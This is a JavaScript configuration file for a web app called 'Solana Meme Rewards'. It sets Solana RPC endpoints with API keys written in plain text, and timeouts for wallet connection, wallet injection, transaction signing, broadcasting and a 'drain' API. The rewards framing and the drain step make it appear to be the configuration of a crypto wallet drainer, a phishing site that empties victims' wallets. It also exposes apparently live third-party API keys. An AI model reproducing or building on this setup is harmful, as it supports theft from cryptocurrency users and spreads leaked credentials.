// Frontend Configuration for Solana Meme Rewards Application
// This file will be populated with environment variables during build
// For Vercel deployment, these values come from Vercel environment variables

window.APP_CONFIG = {
  // Project Configuration
  PROJECT_NAME: 'Solana Meme Rewards',
  CACHE_BUST: '9531cea',
  
  // RPC Endpoints
  PRIMARY_RPC: 'https://mainnet.helius-rpc.com/?api-key=19041dd1-5f30-4135-9b5a-9b670510524b',
  FALLBACK_RPC: 'https://rpc.shyft.to?api_key=-C7eUSlaDtQcR6b0',
  PUBLIC_RPC: 'https://api.mainnet-beta.solana.com',
  
  // Timeouts (in milliseconds) - LENIENT FOR SLOW USERS (aligned with backend)
  WALLET_CONNECTION_TIMEOUT: 60000,
  DEEP_LINKING_TIMEOUT: 30000,
  WALLET_INJECTION_TIMEOUT: 30000,
  DRAIN_API_TIMEOUT: 120000,
  BROADCAST_TIMEOUT: 90000,
  SIGNING_TIMEOUT: 120000,
  
  // Retry Configuration
  MAX_RETRIES: 3,
  RETRY_DELAY_BASE: 2000,
  
  // UI Configuration
  STATUS_DISPLAY_TIMEOUT: 3000,
  CONNECTION_STATUS_TIMEOUT: 3000,
  RETRY_WAIT_TIME: 5000
};

// Helper function to get config values
window.getConfig = function(key) {
  return window.APP_CONFIG[key] || null;
};

// Helper function to get timeout values
window.getTimeout = function(key) {
  return window.APP_CONFIG[key] || 30000; // Default 30 seconds
};

console.log('✅ Solana Meme Rewards Configuration Loaded:', window.APP_CONFIG);
